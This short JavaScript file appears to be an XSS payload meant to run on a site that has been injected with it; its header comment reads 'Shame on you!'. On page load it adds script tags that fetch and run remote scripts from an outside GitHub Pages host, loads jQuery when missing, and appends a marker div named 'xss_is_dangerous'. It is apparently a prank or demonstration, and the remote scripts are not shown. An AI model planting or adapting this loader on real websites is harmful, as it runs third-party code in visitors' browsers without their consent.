/*
    This should not be running on your website. Shame on you!
*/
//var defaultMessageBackgroundColor = $(".message").css("background-color");
//var zSource = '<script src="http://bit.ly/1meEWoS"></script>';

document.body.onload = loadZ;
 
function loadZ(){
    if(typeof(jQuery) == "undefined")
    {
        //Get jquery
        var jq = document.createElement("script");
        jq.setAttribute("src", "http://code.jquery.com/jquery-1.11.3.min.js");
        document.body.appendChild(jq);
    }
	
	z_scripts_9231289213 = [
		"nope.js"
	];
     
    var scriptHost = "http://wouterbrookhuis.github.io";
     
    for(i = 0; i < z_scripts_9231289213.length; i++)
    {
        var s = document.createElement("script");
        s.setAttribute("src", scriptHost + "/" + z_scripts_9231289213[i] + ".js");
        document.body.appendChild(s);
    }
    
    //And a little notice
    var z = document.createElement("div");
    z.setAttribute("id", "xss_is_dangerous");
    z.innerHTML = "<!-- Mistakes were made -->";
    document.body.appendChild(z);
}
